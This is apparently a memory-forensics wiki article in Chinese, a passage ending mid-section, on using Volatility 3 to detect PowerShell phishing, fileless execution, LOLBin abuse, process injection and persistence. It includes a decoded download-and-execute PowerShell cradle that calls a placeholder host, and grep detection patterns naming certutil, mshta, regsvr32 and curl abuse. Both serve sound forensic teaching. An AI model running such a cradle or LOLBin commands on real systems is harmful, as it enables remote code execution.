---
title: "注入执行与免杀痕迹"
slug: "memory-analyze-memory-injection-and-evasion"
canonical: "https://www.digiforensics.cn/wiki/memory-analyze-memory-injection-and-evasion"
license: "CC-BY-SA-4.0"
author: "DigiForensics"
updated_at: "2026-10-09T12:51:51+08:00"
source_url: null
references: ["https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans"]
source_type: "wiki-sync"
category: "memory"
space: "内存与专项取证"
node_path: ["内存分析"]
---

# 注入执行与免杀痕迹

<a id="section-1"></a>

## 一、概述

只要代码跑起来，就会在内存里留下痕迹——这是绕不开的物理事实，也是这里全部检测面的来源。但痕迹能否在镜像里读到，取决于相关页是否仍驻留、有没有被覆盖或释放。

磁盘侧的目标恰恰相反：少落一个文件是一个。少写一次注册表是一个。子进程别长得太扎眼，又是一个。

攻防两侧其实在同一块板上抢地盘——你想让内存看起来干净，取证侧就得证明它不干净。

纯磁盘分析在无文件执行面前基本失效。磁盘镜像上你看到的会是一台"什么都没发生"的机器：没有落地文件、没有新注册表键、事件日志里也只有一条再正常不过的 PowerShell 调用。内存可为这类场景提供磁盘上未保留的运行态证据。

定性这一步落在**分析环节的后段**，位于"已经定位到可疑进程"之后、"写结论"之前。上游是[进程与注入检测](memory-analyze-process-and-injection-detection.md)——先在进程层与 VAD 层找到异常，再来判断具体手法与归属。

关系是双向的：采集工具加载的驱动、EDR 的响应进程，也会在内存里留下形态相似的痕迹。所以每一条判据都必须先排除自己制造的痕迹，再下结论。

九类攻击手法在内存中的载体与关键判据字段：

| 攻击手法 | 内存中的载体 | 关键判据字段 |
|---|---|---|
| PowerShell 钓鱼 | `cmdline` 里的编码参数 | 父进程类型、`-enc`/`-w hidden` 组合 |
| 无文件执行 | VAD 中 `PAGE_EXECUTE*` 的私有页 | `malfind` 命中的 MZ/PE 头 |
| LOLBin 滥用 | 正常程序本体 | 命令行参数与子进程异常 |
| DLL 注入 | `thrdscan` 的远程线程 | 线程起始地址不落在任何已知模块 |
| APC 注入 | 队列 APC 指向 | APC 目标地址所属模块 |
| 进程空化 | 映像名与实际内容 | 模块路径与内存内容不符 |
| 反射式加载 | 内存有 PE、模块链表无 | VAD 保护属性 + 模块列表交叉 |
| 持久化 | 内存中的注册表 hive、ShimCache | `shimcachemem` 读出未落盘的记录 |

最后一行是最有价值的一处：磁盘上的 ShimCache 可能被删或被改，内存里的却是系统当前状态。硬断电时它没来得及落盘——内存侧反而成了唯一的证据来源。

据此能回答的是这些：某个进程是否被注入了代码、注入手法是哪一类、无文件载荷的 PE 是否存在于内存、持久化配置在系统当前状态下是什么样子、某条可疑命令行对应的是哪种钓鱼手法。

回答不了的是这些。它不能告诉你"用户是否知情""是否主观故意"——那是行为归因，需要落盘侧的用户行为证据配合。也不能把"内存里有痕迹"直接等同"入侵成立"，痕迹归属必须先排除采集工具与安全软件。

往下读之前，先确认你已经掌握：进程与 VAD 层的基本概念、父子进程关系与命令行采集方式、以及 Windows 侧至少两类常见注入手法的原理背景。还没做过进程层定位，先看[进程与注入检测](memory-analyze-process-and-injection-detection.md)；

不熟悉 Windows 侧的持久化工件，先看[取证工件地图](../../computer/computer-registry-log/computer-registry-log-windows-artifact-map.md)。内存侧证据如何写进报告，去[内存证据的可采性与报告](../memory-artifact/memory-artifact-memory-evidence-and-reporting.md)。
<a id="section-2"></a>

## 二、核心原理

<a id="section-3"></a>

### 2.1 PowerShell 钓鱼：最高频的初始访问手法

这类攻击的核心是**借一个用户信任的进程启动解释器**，绕开"可执行文件白名单"。**内存中的两个判据**：

**判据一：父子关系异常**——正常是 `explorer.exe → powershell.exe`（用户自己开的）。

异常是 `winword.exe / excel.exe / w3wp.exe / wmiprvse.exe → powershell.exe`（文档钓鱼、Web 应用触发、WMI 触发）。

`windows.pstree` 直接呈现这个关系。**这是最容易看、也最可靠的判据。**

**判据二：命令行特征**：

| 参数 | 含义 | 检测价值 |
|---|---|---|
| `-enc` / `-EncodedCommand` | Base64 编码的命令 | **最经典的规避手法**——审计工具看到的是一串 Base64，看不出内容 |
| `-nop` / `-NoProfile` | 不加载用户 profile | 减少在磁盘 profile 目录留下痕迹 |
| `-w hidden` | 隐藏窗口运行 | 用户不可见 |
| `-ep bypass` / `-ExecutionPolicy Bypass` | 绕过执行策略 | **执行策略不是安全边界，绕过它是有意的规避行为** |
| `IEX` / `Invoke-Expression` | 动态执行字符串 | **本机脚本解释器在内存中生成并执行代码的标志** |
| `New-Object` / `[Reflection.Assembly]` | 内存加载 .NET 程序集 | 典型的无文件执行方式 |
| `DownloadString` / `DownloadFile` | 从网络下载内容 | 明确的 C2 通信意图 |
| `FromBase64String` | Base64 解码 | 与 `-enc` 配对的载荷还原 |

<a id="section-4"></a>

### 2.2 base64 载荷的还原

`-enc` 参数的载荷是 **UTF-16LE 编码的 Base64**：

```bash
# PowerShell 内置（不依赖外部工具）
powershell -NoProfile -Command "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<BASE64字符串>'))"
```

**取证意义**：还原出的内容可能就直接包含 C2 地址、下载 URL、后续命令。

这是从"发现可疑行为"到"发现具体内容"的关键一步。还原后**要作为证据固定下来**（记录原始命令行 + 还原结果 + 还原方法），**只还原一部分**也是有效发现。

> ⚠️ **绝不执行还原出的内容。** 它的价值在于**内容本身**（URL、IP、命令），不在于运行它。取证环境中任何形式的执行都是不可接受的风险。

<a id="section-5"></a>

### 2.3 无文件执行（Fileless）

**原理**：payload 不写磁盘，直接在内存中生成并执行。表现与检测方式：

| 表现 | 检测方式 |
|---|---|
| 内存中有完整 PE 但载荷无对应落盘文件 | `malfind` 命中 + **磁盘镜像侧**（MFT / USN 日志）查无此文件 |
| 内存分配 RWX 区域 | `malfind` 命中 |
| .NET 程序集在内存中加载 | `windows.cmdline` 看到 `[Reflection.Assembly]::Load` |
| 反射式加载的 shellcode | `malfind` + 手工分析 |

**验证标准**（写报告必须做到）：

```
内存中有 PE 映像  AND  磁盘镜像的 MFT/USN 中无对应文件记录  =  无文件执行（跨证据源证明）
```

> ⚠️ **`filescan` 不能用来证明"磁盘无文件"**（源码核实）：`windows.filescan` 走的是 `poolscanner`，扫描的是内存内核池中的文件对象（`_FILE` pool tag），属于内存侧证据。两个方向的局限：文件刚被删除时 `_FILE` 对象可能仍缓存在池中未回收（**命中不等于文件当前存在**）；文件创建于采集前、之后已关闭且对象已回收（**未命中不等于文件从未存在**）。因此"无文件执行"的结论必须由磁盘镜像的 MFT / `$UsnJrnl:$J` 支撑，`filescan` 只能作为辅助线索。
>
> **只满足其一都不足以定性**——内存有 PE 可能只是正常程序，磁盘没文件可能是文件已被删（两种解释）。

<a id="section-6"></a>

### 2.4 LOLBin 滥用

LOLBin（Living Off the Land Binaries） 是 Windows 自带的合法可执行文件。用它们做坏事，不需投放任何文件。

| LOLBin | 滥用方式 | 内存中的判据 |
|---|---|---|
| `rundll32.exe` | 加载 DLL 的导出函数 | 命令行含异常 DLL 路径 + 参数 |
| `mshta.exe` | 执行 HTA 脚本（VBScript/JS） | 命令行含 `javascript:` / `vbscript:` / 外部 URL |
| `regsvr32.exe` | 加载 `scrobj.dll` 执行脚本 | 命令行含 `scrobj.dll` + `i:` 参数 |
| `certutil.exe` | `-urlcache` 下载、`-decode` 解码 | 命令行含 `-urlcache` 或 `-decode` |
| `bitsadmin.exe` / `curl.exe` | 后台传输 / 下载 | 命令行含 `/transfer` 或外部 URL |
| `wmic.exe` | 远程执行、进程创建 | 命令行含 `/node:` 或 `process call create` |
| `cscript.exe` / `wscript.exe` | 执行脚本 | 命令行含 `.vbs`/`.js` 且脚本在临时目录 |

**判读要点**：这些程序**本身完全合法**。

可疑的不是"它存在"，而是"它的命令行参数指向了异常的目标"——非系统目录的 DLL、临时目录的脚本、外部 URL。

**内存判据比磁盘更有效**：LOLBin 执行的脚本可能已被删除，但**进程的命令行在内存中保留了完整原样**。

<a id="section-7"></a>

### 2.5 注入手法与检测

| 手法 | 系统调用 | 内存检测 | 日志侧对应 |
|---|---|---|---|
| **经典 DLL 注入** | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | `malfind`（注入的 DLL 区域）、`ldrmodules`（模块链表不一致） | **Sysmon 事件 8**（CreateRemoteThread） |
| **APC 注入** | `QueueUserAPC` | 线程起始地址异常、`windows.malware.suspicious_threads` | Sysmon 事件 8/10（部分场景） |
| **进程空化** | `CreateProcess(SUSPENDED)` + `NtUnmapViewOfSection` + 写入 + `ResumeThread` | `windows.malware.hollowprocesses` | **Sysmon 事件 25**（Process Tampering） |
| **反射式加载** | 自定义 loader 手动映射 | `malfind` 有 PE + `ldrmodules` 无对应项 | 无直接对应（不调用标准 API） |
| **线程劫持** | 挂起线程 + 修改 EIP | `windows.malware.suspicious_threads`（线程起始地址非预期模块） | 无直接对应 |
| **进程伪装** | 修改 PEB 中的 `ImagePath` | `windows.malware.pebmasquerade` | Sysmon 事件 25 |
| **原子注入** | `NtCreateSection` + 内存映射 | `malfind` **可能不命中**——区域权限不是 `PAGE_EXECUTE_READWRITE`，且模块链表中无对应项 | 无直接对应（不调用标准 API） |

> `windows.malware.suspicious_threads` 是个容易被忽略但很有价值的插件——它专门列出**线程起始地址不在任何已知模块内**的线程。这是反射式加载、线程劫持、注入的共同特征。

<a id="section-8"></a>

### 2.6 持久化在内存中的体现

持久化机制在磁盘上都可能被发现（注册表、任务目录、服务配置），但**内存里看到的是"当前生效状态"**：注册表 Run/RunOnce 键、UserAssist（程序执行计数）、计划任务、服务二进制路径都可以从内存中的 hive 直接读出，命令见第七节速查。

**`shimcachemem`：本篇的精华**

ShimCache（应用兼容性缓存）的**磁盘副本**是 `SYSTEM` hive 中的 `AppCompatCache`，它在**系统正常关机时写入**。

系统被强制断电、崩溃、或硬关机时，`AppCompatCache` **来不及落盘**。磁盘上的 ShimCache 只反映**上一次正常关机**的状态。

但内存中的 ShimCache 是内核当前维护的运行时结构，它反映的是"到现在为止"运行过什么程序。 硬断电丢失的正是这一段：

```
磁盘 ShimCache：反映 [上次正常关机] 之前的程序执行
内存 ShimCache：反映 [开机至今] 的程序执行
                 ↑ 强制断电导致丢失的正是这一段
```

> **这是一个关键的判读点**：当其他所有工件都因为断电而失真时，内存 ShimCache 提供了**断电前最后一段运行历史**。对应的磁盘侧分析见[计算机取证 Windows 板块 06 篇](../../computer/computer-execution/computer-execution-shimcache-amcache.md)。

`shimcachemem` 这类插件的参数与缓存机制见[第 03 篇](../memory-acquire/memory-acquire-volatility3.md)，插件选错会让整条分析线断掉。

---

<a id="section-9"></a>

## 三、操作步骤

<a id="section-10"></a>

### 3.1 第 1 步：全量提取命令行与父子关系

```bash
python3 vol.py -f DigiForensics-mem.raw -r csv  windows.cmdline > /work/cmdline.csv
head -1 /work/cmdline.csv        # TreeDepth,PID,Process,Args（先确认列名）
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.pstree > /work/pstree.txt
```

<a id="section-11"></a>

### 3.2 第 2 步：筛选可疑命令行

```bash
# PowerShell 可疑参数组合
grep -i 'powershell\|pwsh' /work/cmdline.csv | grep -iE \
  '\-enc|\-nop|\-w hidden|\-ep bypass|\-executionpolicy|FromBase64String|Invoke-Expression'

# LOLBin 可疑用法：程序名正常才正常，目标异常才异常
grep -iE 'rundll32|mshta|regsvr32|certutil|bitsadmin|wmic|curl|wget' /work/cmdline.csv \
  | grep -iE 'http|\.dll|javascript:|vbscript:|scrobj|urlcache|decode|transfer|node:'

# 指向异常目录的执行
grep -iE '\\\\AppData\\\\|\\\\Temp\\\\|\\\\ProgramData\\\\|\\\\Users\\\\Public\\\\|\\\\Windows\\\\Temp' \
  /work/cmdline.csv

# 父子关系：Office 启动 shell / 服务宿主启动非服务进程
grep -iE 'winword|excel|powerpnt|outlook' /work/pstree.txt | grep -iE 'powershell|cmd\.exe|wscript|cscript|mshta|regsvr32'
grep 'svchost.exe' /work/pstree.txt | grep -viE 'svchost\.exe$'
```

<a id="section-12"></a>

### 3.3 第 3 步：还原 base64 载荷

```bash
# 提取 -enc 后的字符串并还原（只还原，不执行）
powershell -NoProfile -Command "
  [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAA'))" 2>/dev/null
# 输出：IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.example.com/a.ps1')

# 记录原始命令行 + 还原结果，作为固定证据
echo "原始: $(grep -oE '\-enc[a-zA-Z]* [A-Za-z0-9+/=]+' <匹配行>)" >> /work/ps-payloads.txt
echo "还原: IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.example.com/a.ps1')" \
  >> /work/ps-payloads.txt
```

<a id="section-13"></a>

### 3.4 第 4 步：无文件执行的验证

```bash
# 1) 内存中找可疑 PE
python3 vol.py -f DigiForensics-mem.raw -r csv windows.malware.malfind > /work/malfind.csv
grep -i 'PAGE_EXECUTE_READWRITE' /work/malfind.csv | head -20

# 2) 确认对应进程的命令行
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.cmdline \
  | grep -iE 'Reflection\.Assembly|FromBase64String|DownloadString|New-Object.*IO\.MemoryStream'

# 3) 导出命中的区域验证 MZ 头
mkdir -p /work/mf
python3 vol.py -f DigiForensics-mem.raw -o /work/mf windows.malware.malfind --dump
xxd -l 4 /work/mf/pid.8124.*.dmp       # 4d5a = MZ

# 4) filescan 只作辅助线索：确认该文件当前无活动的 _FILE 对象
python3 vol.py -f DigiForensics-mem.raw -r csv windows.filescan > /work/filescan.csv
grep -ic '<可疑文件名>' /work/filescan.csv    # 0 = 池中无活跃文件对象

# 5) 结论性证据必须来自磁盘镜像
#   MFT 中无该文件记录  或  $UsnJrnl:$J 显示 create+delete 成对出现
```

<a id="section-14"></a>

### 3.5 第 5 步：注入手法综合排查

```bash
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.malware.ldrmodules --pid <PID>
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.malware.hollowprocesses
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.malware.pebmasquerade
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.malware.suspicious_threads
python3 vol.py -f DigiForensics-mem.raw -r csv  windows.malware.psxview | grep -E ',False,'  # 摘链进程

# 原子注入：权限是 RW 而非 RWX，标准 malfind 会漏检 → 用 YARA 补充
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.vadyarascan --yara-file /work/rules.yar

# 摘链进程（详见第 05 篇）
python3 vol.py -f DigiForensics-mem.raw -r csv windows.malware.psxview | grep -E ',False,'
```

<a id="section-15"></a>

### 3.6 第 6 步：持久化与 ShimCache

```bash
# 注册表自启动项与执行历史
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.registry.printkey \
  --key 'Software\Microsoft\Windows\CurrentVersion\Run'
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.registry.printkey \
  --key 'Software\Microsoft\Windows\CurrentVersion\RunOnce'
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.registry.userassist

# 计划任务与服务
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.registry.scheduled_tasks
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.svcscan
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.svclist

# ShimCache（断电场景的救命证据）
python3 vol.py -f DigiForensics-mem.raw -r pretty windows.shimcachemem
#   列：Order,Last Modified,Last Update,Exec Flag,File Size,File Path
```

---
<a id="section-16"></a>

## 四、常见陷阱

免杀技术的目标是减少磁盘痕迹，**这恰恰把分析压力转移到了内存上**。

但内存痕迹的解读有自己的陷阱：判据太容易单点成立，证据源容易取错，"没找到"太容易被写成"没有"。

本章按命令行判读、载荷还原、无文件执行举证、跨源交叉四个环节展开。

<a id="section-17"></a>

### 4.1 命令行与 LOLBin 判读

<a id="section-18"></a>

#### 陷阱 1：看到 PowerShell 就定性为恶意

**现象**：命令行里出现 `powershell.exe`，报告写"发现可疑 PowerShell 执行"。

**原因**：2.4 的判读要点说得很清楚——这些程序本身完全合法，可疑的不是"它存在"，而是"它的命令行参数指向了异常的目标"。企业环境中系统管理、部署脚本、监控代理全都用 PowerShell，**进程名的出现频率与其可疑性完全无关**。而且 2.1 表格里 `IEX`、`New-Object`、`DownloadString` 这些参数的"检测价值"是"标志"级别——标志意味着需要看上下文，不是单独的定罪依据。

**影响**：假阳性会淹没真阳性。

在管理型工作站上 `powershell.exe` 可能有几十个实例，全部标注为可疑后，真正的 `WINWORD.EXE → powershell.exe` 那个（案例第 3 步的发现）就埋在里面了。

**更糟的是它损害报告的专业性**——委托方看到"几十个可疑 PowerShell"，会认为分析员在用关键词匹配代替分析。

**核查**：**看参数组合，不看程序名**。

2.1 的参数表要成组看：`执行策略绕过 + 编码参数 + 隐藏窗口 + 不加载 profile` 这类组合才有指向性（案例第 1 步的 PID 8124 就是四项齐备）。单独一个 `-NoProfile` 出现在任何地方都属正常。

顺序也很重要——**先筛出参数组合命中的少量进程，再逐个看父子关系**。

<a id="section-19"></a>

#### 陷阱 2：只按程序名筛 LOLBin，把正常用法当恶意

**现象**：`rundll32.exe`、`mshta.exe`、`certutil.exe` 出现在命令行列表里，逐条列为可疑。

**原因**：2.4 的表格把每种 LOLBin 的**滥用方式**与**判据**分列，其中判据一栏全部是"命令行含 XX"这类**组合条件**——`rundll32` 的判据是"命令行含**异常 DLL 路径** + 参数"，不是"出现了 rundll32"。`rundll32` 执行系统 DLL（`shell32.dll` 的 `Control_RunDLL`）是 Windows 组件调用的常规方式，`certutil` 在证书运维里天天用。

**影响**：与陷阱 1 同类，但更严重。

LOLBin 的正常用法在企业环境里**极其常见**，误报量会远超 PowerShell。

而且 LOLBin 的分析价值恰恰在于"正常外壳 + 异常参数"这个组合。**只筛程序名等于主动丢弃了这个判据**。

**核查**：**两级过滤**（3.2 的做法）。

第一级筛程序名，缩小范围。第二级筛异常目标——`http`、非系统目录的 `.dll`、`javascript:`、`scrobj`、`urlcache`、`decode`、`/transfer`、`/node:`。

第二级才是真正的判据。

同时注意 2.4 末尾的提示：LOLBin 执行的脚本可能已被删除，但进程的命令行在内存中保留了完整原样。这正是内存侧比磁盘侧有效的原因，也是这条线索不可放弃的理由。

<a id="section-20"></a>

#### 陷阱 3：只看磁盘找 PowerShell 痕迹，结论写"未发现"

**现象**：在磁盘镜像里搜 `.ps1`、`-enc`、PowerShell 相关关键字，一无所获，报告写"未发现 PowerShell 相关的攻击活动"。

**原因**：本篇的核心命题就是**"免杀"的技术实质是减少在磁盘上的痕迹**——不落文件、不写注册表，脚本执行完即删。磁盘上什么都没有，正是这类攻击的预期结果，**不是攻击不存在的证据**。而 2.4 已经说明命令行在内存中保留完整原样，这是内存侧相对磁盘侧的独特价值。

**影响**：**结论方向完全错了**——你用最弱的方法检验了最强的假设。

"磁盘没找到"是这类攻击的常态，用它得出否定结论，等于把方法的局限当成了事实。

**核查**：**从内存侧入手**，`windows.cmdline` 全量提取后按参数组合筛（3.1 的第一步就是这个）。

报告里"磁盘侧未发现"和"内存侧未发现"是两条独立结论，前者不构成对后者的支撑。

当攻击手法以减少磁盘痕迹为目标时，磁盘侧的阴性结果不具排除力——这个判断要在报告里写明。

<a id="section-21"></a>

#### 陷阱 4：把命令行当"什么时候"的证据

**现象**：在命令行里看到 `powershell.exe -enc ...`，据此推断该命令在某个时间点执行，纳入时间线。

**原因**：**命令行只说明"怎么启动"，不说明"什么时候"**。进程对象里的创建时间是一个可被读取也可被伪造的字段，而内存镜像本身是采集区间内的混合体（[第 01 篇](../memory-acquire/memory-acquire-memory-forensics-overview.md)已说明不能用它做毫秒级时序推理）。把命令行的存在当成时间证据，是把"内容证据"当成"时间证据"。

**影响**：时间线错位。

委托方往往会拿你的时间线与登录记录、告警时间做比对，一个不准确的时间戳会让整段行为链的可信度下降。

案例第 4 步里 `shimcachemem` 的 `Last Modified` / `Last Update` 与内存字符串提取做**时间关联**，这才是正确做法——用两个独立来源的时间互相印证，而不是用单一来源下结论。

**核查**：命令行提供的是**行为与参数证据**，时间要另找来源——进程创建时间（与 `pslist` 交叉）、事件日志里的 4688、ShimCache 的 `Last Modified`、Prefetch。

至少两个独立时间来源一致时，才把该时间点写进时间线。

<a id="section-22"></a>

### 4.2 载荷还原

<a id="section-23"></a>

#### 陷阱 5：执行还原出的 base64 载荷 ★

**现象**：还原出 `IEX (New-Object Net.WebClient).DownloadString('http://.../a.ps1')` 之后，想"进一步确认它能做什么"，在取证机上执行了这段内容。

**原因**：这不是技术误判而是**取证纪律问题**，但它有明确的技术后果。2.2 的警告框写得很直接——绝不执行还原出的内容，它的价值在于内容本身，不在于运行它。执行会造成：向真实或仿真的 C2 地址发起请求（可能暴露取证行动、触发对方警觉或产生法律问题）、在分析机上落地文件或写注册表（**污染了后续要继续使用的分析环境**）、载荷行为不确定（可能有反分析分支）。

**影响**：**不可逆**，且不止影响本案件。

取证机通常是长期复用的机器，一旦执行了载荷，后续所有案件的证据都可能受到污染。

案例第 2 步的还原用的是 `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(...))`——**这个调用链只有解码，没有任何执行语义**，这是安全的形态。

**核查**：**只解码到字符串，不做任何形式的执行**。

还原命令用纯解码 API 组合，输出重定向到文件。

执行过的还原结果与未执行过的结果在证据价值上完全相同——还原的价值是拿到 C2 地址、后续命令这些**内容**，不需要运行来证明。

案例的结论表把"载荷为 .NET 无文件下载执行"定为"强（载荷内容已固定）"，依据是内容本身，不是运行结果。

<a id="section-24"></a>

#### 陷阱 6：只还原了一部分就当作完整载荷

**现象**：`-enc` 后面跟了一长串 Base64，手工复制了一部分（命令行在渲染时被换行截断），还原出半截命令，报告写成"载荷内容为…"。

**原因**：**PowerShell 命令行在渲染时经常跨行**，`-r pretty` 下长命令行会被折行显示，手工从终端输出里复制极易只拿到前半段。更隐蔽的是案例第 1 步的 CSV 输出里那串 Base64 **本身就是被截断的示例**（以 `...aHR0cA` 结束，末尾没有补齐），若照抄会得到不完整结果。**Base64 解码对长度有要求**——长度不是 4 的倍数或含非法字符时会抛异常或截断，而截断后的解码结果是一段**语法完整但语义不完整**的字符串，看起来完全正常。

**影响**：把不完整的内容当作完整内容报告，丢失的往往是最后那半段——**而那半段可能正是实际的 C2 地址或落盘路径**。

案例第 4 步的二阶段载荷 `b1.png` 就是靠**内存字符串提取**（`strings-all.txt` 里的完整 URL）补上的，命令行里的截断串无法提供它。

**核查**：从 CSV 结构化输出里用程序提取完整字段，不用终端复制。

`-r csv` 的 `Args` 字段是完整的一整行，用 `cut`/`rg` 按 PID 提取到变量再还原。

还原后**核对解码结果是否语法完整**（是否以完整的引号、语句结尾），不完整就回到提取环节。

**只还原一部分也是有效发现**（2.2 明确），但表述要写"已还原的命令片段为…"，不是"载荷为…"。

<a id="section-25"></a>

#### 陷阱 7：不固定还原过程，只留结果

**现象**：把还原出的 C2 地址写进报告，但没有记录原始 Base64 字符串、还原命令、还原环境。

**原因**：2.2 明确要求还原后要作为证据固定下来（记录原始命令行 + 还原结果 + 还原方法）。理由是这条链路的每一步都需要可复核：`[Text.Encoding]::Unicode.GetString` 的编码选择（UTF-16LE）是不是与原始编码一致？如果原始载荷用的是别的编码，你用 Unicode 解出来的就是乱码——**而乱码可能被误当成"这是加密内容"**。没有记录还原方法，复核人无法判断你用的是哪种编码假设。

**影响**：证据链断点。

案例的引文把"base64 载荷的还原过程要完整记录（原始字符串 + 还原方法 + 还原结果）"称为"**发现**到**定性**的关键一步"——记录本身就是定性的组成部分。

缺少原始串，报告里的 C2 地址就成了一个无法溯源的孤立信息。

**核查**：三个要素一起存档——原始命令行（含完整 Base64）、还原命令（含编码参数）、还原结果，三者写入同一个证据文件并计算哈希。

案例第 2 步的 `evidence-fixed.txt` 就是在做这件事。

**报告正文引用这个文件，而不是直接粘贴还原结果**。

<a id="section-26"></a>

### 4.3 无文件执行的举证

<a id="section-27"></a>

#### 陷阱 8：用 `filescan` 证明"磁盘无文件"

**现象**：`windows.filescan` 里搜不到可疑载荷文件名，报告写"磁盘上不存在该文件，确认为无文件执行"。

**原因**：2.3 的警告框做了源码级核实并指出了**两个方向的局限**。`windows.filescan` 走的是 `poolscanner`，扫描的是内存内核池中的文件对象（`_FILE` pool tag）——它属于**内存侧证据**，不是磁盘证据。方向一：文件刚被删除时 `_FILE` 对象可能仍缓存在池中未回收，**命中不等于文件当前存在**。方向二：文件创建于采集前、之后已关闭且对象已回收，**未命中不等于文件从未存在**。而"无文件执行"的结论需要的是"磁盘上从未有过这个文件"，这与"内存池里现在没有这个文件对象"是两个不同的命题。

**影响**：这是本篇**举证责任最重的一条**。

"无文件执行"是一个技术定性，需要跨证据源证明。而用一个原理上不承载该命题的工具去支撑它，等于**结论与证据不匹配**。

一旦对方指出 `filescan` 扫的是内存池，整个定性连带基于它的所有推论一起崩塌。

**核查**：**双源证明**。

2.3 给出的验证标准是明确的——「内存中有 PE 映像 **AND** 磁盘镜像的 MFT/USN 中无对应文件记录 = 无文件执行（**跨证据源证明**）」。

`filescan` 只能作为辅助线索（3.4 第 4 步的注释就是这个定位：「确认该文件当前无活动的 `_FILE` 对象」）。

案例第 3 步的三源成立值得照抄——内存 MZ 头 PE + 磁盘 MFT 无记录 + USN 日志显示创建后 1.8 秒即删。

<a id="section-28"></a>

#### 陷阱 9：只满足验证标准的一边就定性

**现象**：内存里 `malfind` 命中了 MZ 头的 PE，报告直接写"无文件执行"；或者磁盘 MFT 里确实没这个文件，直接写"该程序是 fileless"。

**原因**：2.3 的收尾句已经把两种替代解释摆出来了——「**只满足其一都不足以定性**：内存有 PE 可能只是正常程序，磁盘没文件可能是文件已被删（两种解释）」。内存有 PE 的最常见解释是 JIT 引擎和正常程序的自身映像（见陷阱 11）；磁盘没文件的最常见解释是文件被正常删除。**两个条件都满足时它们才互相排除掉这些替代解释**，这是"AND"的逻辑力量所在。

**影响**：单边满足时的定性在质证中极易被推翻——对方只需提出一个良性解释。

而"无文件执行"往往出现在报告的关键结论位置（它解释了"为什么磁盘上什么都没有"）。一旦被推翻，整条攻击链的叙述都要重写。

**核查**：**两个条件都取证，且都写明取自哪个证据源**。

内存侧：`malfind` 命中 + `MZ` 头确认 + **进程活动状态确认**。

磁盘侧：MFT 无记录（注意 MFT 的记录可能被重用/覆盖，需配合 USN 日志）+ `$UsnJrnl:$J` 显示 create 与 delete 成对出现。

案例第 3 步的 USN 细节（间隔 1.8 秒、删除后 0.4 秒出现 4688）之所以有价值，正是因为它把"创建—执行—删除"这个序列固定下来了。

<a id="section-29"></a>

#### 陷阱 10：把"没落文件"当"没有痕迹"

**现象**：在磁盘侧确认没有载荷文件，报告写"攻击者未在磁盘留下任何痕迹，属无文件攻击"。

**原因**：**"无落盘文件"只覆盖痕迹的一个子类**。本篇表格列出的九种手法里，落盘情况各不相同：PowerShell 钓鱼会在 Prefetch、事件日志、注册表 UserAssist、AMSI 缓存里留下痕迹；进程空化会改写目标进程；线程劫持不改文件；**持久化一定会落盘**（注册表/计划任务/服务）。案例第 5 步专门查了 Run 键、计划任务、服务三项——**它们恰恰是落盘的**。所以"没有载荷文件"与"没有痕迹"之间隔着整个痕迹谱系。

**影响**：**误导排查方向**。

"无文件攻击"这个标签会让委托方以为"查磁盘没用"，从而放弃对注册表、日志、Prefetch 的分析——而这些恰恰是这类攻击留下痕迹最多的地方。

**核查**："无落盘文件"只是一个技术属性，不是攻击特征的完整描述。

报告里写清"该载荷未在磁盘上以文件形式存在（经 MFT 与 USN 核实）"，然后**独立完成其余痕迹的系统排查**（本篇 3.6 那一节就是清单）。

`strings-all.txt` 里的内存字符串提取也是一条独立线索——案例第 4 步正是靠它拿到了二阶段载荷名 `b1.png`，而这个名字在磁盘上任何地方都不存在。

<a id="section-30"></a>

### 4.4 跨源交叉与阴性表述

<a id="section-31"></a>

#### 陷阱 11：只看 `malfind` 找注入，把原子注入漏掉

**现象**：跑完 `malfind`，只筛 `PAGE_EXECUTE_READWRITE`，未发现异常，结论写"未发现注入"。

**原因**：2.5 的表格最后一行说明了原子注入的特殊性——它用 `NtCreateSection` 把代码映射到**RW（非 RWX）**的区域，`malfind` 的判定逻辑要求区域含 `PAGE_EXECUTE`，**因此标准 `malfind` 对这一形态不命中**。3.5 与速查都专门标注了「权限是 RW 而非 RWX，标准 malfind 不命中 → 用 YARA 补充」。这是一类**工具的能力边界**，不是配置问题。

**影响**：阴性结论的覆盖面被高估。

`malfind` 的阴性只覆盖"可执行私有页 + PE 头"这一类，不覆盖权限位上不带 `PAGE_EXECUTE` 的代码映射。因此单靠它得出"未发现注入"，等于把工具的判据当成了事实。

**核查**：**阴性结论必须与检测手段的判据一一对应**。

用 `vadyarascan` 配 YARA 规则扫 VAD 区域（3.5 有命令），补充 `windows.malware.suspicious_threads`（2.5 的引文指出它专门列出**线程起始地址不在任何已知模块内**的线程，是反射式加载、线程劫持、注入的共同特征）。

报告里写阴性结论时逐项列出"用了哪些检测手段、每种覆盖什么形态"——这样读者才知道覆盖边界在哪。

<a id="section-32"></a>

#### 陷阱 12：把 JIT 进程（Java/Chrome/Office）的 `malfind` 命中当恶意

**现象**：在 `chrome.exe` 或 `java.exe` 里发现 `PAGE_EXECUTE_READWRITE` 私有页，列为注入证据。

**原因**：JIT 引擎**天然产生私有可执行页**——它在运行时生成机器码、申请 RWX 内存、把它当代码执行。这与恶意注入在内存形态上无法区分，**区别只在于"它是不是这个程序该有的"**。所以判断必须结合进程类型。

**影响**：假阳性。

在浏览器进程上，`malfind` 命中几十条是常态。逐条排除不现实，结果要么全部忽略（漏掉真目标）要么全部标注（报告不可辩护）。

